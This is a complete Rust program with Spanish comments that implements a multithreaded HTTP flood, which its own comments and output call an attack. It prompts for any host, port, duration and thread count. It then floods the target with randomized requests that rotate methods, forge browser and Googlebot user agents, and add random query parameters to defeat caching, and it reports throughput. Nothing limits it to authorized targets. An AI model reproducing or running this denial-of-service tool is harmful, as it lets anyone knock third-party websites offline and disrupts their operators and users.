use std::io::{self, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use rand::{seq::SliceRandom, Rng};

/// Función principal que lanza el ataque HTTP Flood.
/// Se ejecuta en múltiples hilos, cada uno con su propio bucle.
fn http_flood(
    target_host: String,
    port: u16,
    duration: Duration,
    running: Arc<AtomicBool>,
    requests_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    thread_id: u32,
) {
    let start_time = Instant::now();
    let target = format!("{}:{}", target_host, port);

    // Resolvemos el DNS una sola vez por hilo para mayor eficiencia.
    let socket_addrs: Vec<_> = match target.to_socket_addrs() {
        Ok(addrs) => addrs.collect(),
        Err(e) => {
            eprintln!("[Thread {}] Error: No se pudo resolver el DNS de '{}': {}", thread_id, target, e);
            return;
        }
    };
    
    if socket_addrs.is_empty() {
        eprintln!("[Thread {}] Error: No se encontraron direcciones IP para '{}'", thread_id, target);
        return;
    }
    let socket_addr = socket_addrs[0]; // Usamos la primera dirección resuelta.

    // Datos para generar peticiones aleatorias
    const USER_AGENTS: &[&str] = &[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    ];
    const METHODS: &[&str] = &["GET", "POST", "PUT", "DELETE", "HEAD"];
    const PATHS: &[&str] = &["/", "/search", "/api/v1/data", "/user/profile", "/admin", "/wp-login.php"];

    // Bucle principal del ataque
    while running.load(Ordering::Relaxed) && start_time.elapsed() < duration {
        let mut rng = rand::thread_rng();
        
        // Conexión con timeout para evitar que el hilo se bloquee indefinidamente.
        let stream_result = TcpStream::connect_timeout(&socket_addr, Duration::from_secs(2));
        
        let mut stream = match stream_result {
            Ok(s) => s,
            Err(_) => continue, // Si falla la conexión, intentamos de nuevo.
        };

        // Construcción de la petición HTTP
        let method = *METHODS.choose(&mut rng).unwrap();
        let path = *PATHS.choose(&mut rng).unwrap();
        let user_agent = *USER_AGENTS.choose(&mut rng).unwrap();
        let random_param = rng.gen::<u32>();

        let mut request = String::new();
        request.push_str(&format!("{} {}?rnd={} HTTP/1.1\r\n", method, path, random_param));
        request.push_str(&format!("Host: {}\r\n", target_host));
        request.push_str(&format!("User-Agent: {}\r\n", user_agent));
        request.push_str("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n");
        request.push_str("Connection: close\r\n"); // Usamos 'close' para no mantener la conexión.

        if method == "POST" || method == "PUT" {
            let body = format!("data={}", rng.gen::<u32>());
            request.push_str("Content-Type: application/x-www-form-urlencoded\r\n");
            request.push_str(&format!("Content-Length: {}\r\n\r\n", body.len()));
            request.push_str(&body);
        } else {
            request.push_str("\r\n");
        }
        
        // Enviar la petición y actualizar contadores atómicos
        if stream.write_all(request.as_bytes()).is_ok() {
            requests_sent.fetch_add(1, Ordering::Relaxed);
            bytes_sent.fetch_add(request.len() as u64, Ordering::Relaxed);
        }
        // El stream se cierra automáticamente aquí cuando `stream` sale del scope (RAII).
    }
}

fn main() {
    println!("=== Rust HTTP Stress Tool ===");

    // --- Recolección de datos del usuario ---
    let target_host = get_input("Ingrese el host/IP objetivo:");
    let port: u16 = get_input("Ingrese el puerto:")
        .parse()
        .expect("Puerto inválido. Debe ser un número.");
    let duration_secs: u64 = get_input("Duración del ataque (segundos):")
        .parse()
        .expect("Duración inválida. Debe ser un número.");
    let threads: u32 = get_input("Número de hilos:")
        .parse()
        .expect("Número de hilos inválido. Debe ser un número.");

    let duration = Duration::from_secs(duration_secs);

    // --- Configuración de estado compartido y señal de parada ---
    let running = Arc::new(AtomicBool::new(true));
    let requests_sent = Arc::new(AtomicU64::new(0));
    let bytes_sent = Arc::new(AtomicU64::new(0));
    
    // Capturar Ctrl+C para detener los hilos de forma segura
    let r = running.clone();
    ctrlc::set_handler(move || {
        println!("\nDeteniendo ataque...");
        r.store(false, Ordering::SeqCst);
    }).expect("Error al configurar el manejador de Ctrl-C");

    println!("\nIniciando ataque a {} en el puerto {} por {} segundos con {} hilos...", target_host, port, duration_secs, threads);
    println!("Presiona Ctrl+C para detener.");

    let start_time = Instant::now();
    let mut thread_handles = vec![];

    // --- Lanzamiento de los hilos de ataque ---
    for i in 0..threads {
        let host_clone = target_host.clone();
        let running_clone = running.clone();
        let requests_clone = requests_sent.clone();
        let bytes_clone = bytes_sent.clone();

        let handle = thread::spawn(move || {
            http_flood(host_clone, port, duration, running_clone, requests_clone, bytes_clone, i + 1);
        });
        thread_handles.push(handle);
    }

    // --- Hilo para mostrar estadísticas en tiempo real ---
    while running.load(Ordering::Relaxed) && start_time.elapsed() < duration {
        thread::sleep(Duration::from_secs(2));
        let elapsed_secs = start_time.elapsed().as_secs_f64().max(1.0);
        let current_requests = requests_sent.load(Ordering::Relaxed);
        let current_bytes = bytes_sent.load(Ordering::Relaxed);
        
        let rps = current_requests as f64 / elapsed_secs;
        let mbps = (current_bytes as f64 * 8.0) / (elapsed_secs * 1_000_000.0);

        print!("\r[+] Peticiones: {:<10} | RPS: {:<10.2} | Ancho de banda: {:<7.2} Mbps", current_requests, rps, mbps);
        io::stdout().flush().unwrap();
    }
    running.store(false, Ordering::SeqCst); // Asegurar que todos los hilos se detengan

    // --- Esperar a que los hilos terminen y mostrar resultados finales ---
    for handle in thread_handles {
        handle.join().unwrap();
    }

    let final_requests = requests_sent.load(Ordering::Relaxed);
    let final_bytes = bytes_sent.load(Ordering::Relaxed);
    let total_duration = start_time.elapsed().as_secs_f64();
    let avg_rps = final_requests as f64 / total_duration;
    let avg_mbps = (final_bytes as f64 * 8.0) / (total_duration * 1_000_000.0);

    println!("\n\n--- Ataque completado ---");
    println!("Duración total: {:.2} segundos", total_duration);
    println!("Total de peticiones enviadas: {}", final_requests);
    println!("Total de datos enviados: {:.2} MB", final_bytes as f64 / 1_048_576.0);
    println!("RPS promedio: {:.2}", avg_rps);
    println!("Ancho de banda promedio: {:.2} Mbps", avg_mbps);
}

/// Función auxiliar para obtener entrada del usuario.
fn get_input(prompt: &str) -> String {
    print!("{} ", prompt);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).expect("Error al leer la línea");
    input.trim().to_string()
}
